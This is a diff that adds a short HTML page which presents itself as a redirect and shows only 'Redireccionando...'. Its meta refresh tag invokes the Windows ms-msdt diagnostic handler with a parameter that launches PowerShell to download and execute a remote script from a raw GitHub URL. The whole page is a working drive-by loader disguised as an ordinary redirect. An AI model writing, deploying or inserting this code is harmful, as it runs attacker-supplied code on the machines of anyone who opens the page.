@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="refresh" content="0; url=ms-msdt:/id PCWDiagnostic /skip force /param 'IT_SelectProgram=PowerShell -c IEX(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/L3AC/rvs/refs/heads/main/psvv.ps1\')'" />
+</head>
+<body>
+    Redireccionando...
+</body>
+</html>
